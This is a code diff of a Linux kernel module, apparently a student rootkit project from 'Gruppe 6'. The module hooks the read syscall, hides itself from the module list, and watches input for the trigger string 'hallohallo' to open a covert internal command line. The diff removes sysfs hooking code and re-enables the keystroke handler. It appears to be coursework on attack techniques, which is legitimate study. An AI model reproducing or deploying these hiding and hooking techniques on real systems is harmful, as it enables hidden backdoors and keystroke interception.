@@ -10,19 +10,10 @@
 #include "hook_read.h"
 #include "hide_module.h"
 
-
-/// sysfs stuff
-typedef int (*fun_int_file_dirent_filldir_t)(struct file *, void*, filldir_t);
-fun_int_file_dirent_filldir_t original_sysfs_readdir;
-filldir_t original_sysfs_filldir;
-
-
 char activate_pattern[] = "hallohallo";
 int size_of_pattern = sizeof(activate_pattern)-1;
 int cur_position = 0;
 int last_match = -1;
-
-struct list_head tos;
 
 // stuff for "internal command line"
 char internal_cl[2048];
@@ -33,9 +24,6 @@ int  cl_pos = 0;
 typedef int (*fun_int_void)(void);
 
 static void handleChar(char c){
-    OUR_DEBUG("hooked read!!!!!!!\n");
-
-    return;
     if(c=='\n' || c == '\r'){ //cancel command with newline
 //        OUR_DEBUG("newline");
         last_match = -1;
@@ -85,7 +73,6 @@ static void handleChar(char c){
 static void handle_input(char *buf, int count)
 {
     int i;
-    OUR_DEBUG("handle_input\n");
     for(i = 0; i<count; i++){
         handleChar(buf[i]);
     }
@@ -104,7 +91,7 @@ static int __init _init_module(void)
 /* Exiting routine */
 static void __exit _cleanup_module(void)
 {
-    unhook_sysfs();
+    unhide_module();
     unhook_read();
     printk(KERN_INFO "Gruppe 6 says goodbye.\n");
 }
